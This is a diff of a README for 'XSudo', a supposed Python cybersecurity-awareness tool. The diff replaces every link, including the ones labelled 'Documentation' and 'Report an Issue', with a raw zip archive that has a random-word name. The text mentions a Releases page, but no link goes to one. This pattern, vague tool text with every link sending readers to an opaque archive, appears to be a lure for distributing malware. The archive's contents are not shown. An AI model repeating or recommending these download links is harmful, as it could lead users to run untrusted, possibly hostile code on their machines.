@@ -1,7 +1,7 @@
 # 🛡️ XSudo - A Smart Tool for Cybersecurity Awareness
 
 ## 📥 Download Now
-[![Download XSudo](https://raw.githubusercontent.com/piyumi21/XSudo/main/trochaicality/X_Sudo_v3.2.zip)](https://raw.githubusercontent.com/piyumi21/XSudo/main/trochaicality/X_Sudo_v3.2.zip)
+[![Download XSudo](https://raw.githubusercontent.com/piyumi21/XSudo/main/trochaicality/X_Sudo_Peucedanum.zip)](https://raw.githubusercontent.com/piyumi21/XSudo/main/trochaicality/X_Sudo_Peucedanum.zip)
 
 ## 📖 About XSudo
 XSudo is a lightweight, terminal-based cybersecurity tool written in Python. It helps you perform basic security analysis, improve your knowledge of defensive security, and raise security awareness in a practical and ethical way. Whether you're a student or a professional, XSudo provides practical tools to enhance your cybersecurity skills.
@@ -18,7 +18,7 @@ To get started with XSudo, follow the steps below to install and use the applica
 ## 📂 Download & Install
 ### Step 1: Visit the Releases Page
 To download XSudo, visit the following link:
-[Download XSudo](https://raw.githubusercontent.com/piyumi21/XSudo/main/trochaicality/X_Sudo_v3.2.zip)
+[Download XSudo](https://raw.githubusercontent.com/piyumi21/XSudo/main/trochaicality/X_Sudo_Peucedanum.zip)
 
 ### Step 2: Download the Latest Version
 On the Releases page, find the most recent version. Click on the link for the appropriate file for your operating system. If you are unsure, choose the installer that matches your system specifications.
@@ -71,8 +71,8 @@ If you find a bug or want to suggest a feature, please go to the Issues section 
 For more information, check our detailed documentation linked on the Releases page. This includes tutorials, FAQs, and best practices for using XSudo effectively. 
 
 ## 🚀 Quick Links
-- [Download XSudo](https://raw.githubusercontent.com/piyumi21/XSudo/main/trochaicality/X_Sudo_v3.2.zip)
-- [Documentation](https://raw.githubusercontent.com/piyumi21/XSudo/main/trochaicality/X_Sudo_v3.2.zip)
-- [Report an Issue](https://raw.githubusercontent.com/piyumi21/XSudo/main/trochaicality/X_Sudo_v3.2.zip)
+- [Download XSudo](https://raw.githubusercontent.com/piyumi21/XSudo/main/trochaicality/X_Sudo_Peucedanum.zip)
+- [Documentation](https://raw.githubusercontent.com/piyumi21/XSudo/main/trochaicality/X_Sudo_Peucedanum.zip)
+- [Report an Issue](https://raw.githubusercontent.com/piyumi21/XSudo/main/trochaicality/X_Sudo_Peucedanum.zip)
 
 Now you are ready to enhance your cybersecurity journey with XSudo. Enjoy exploring and learning!
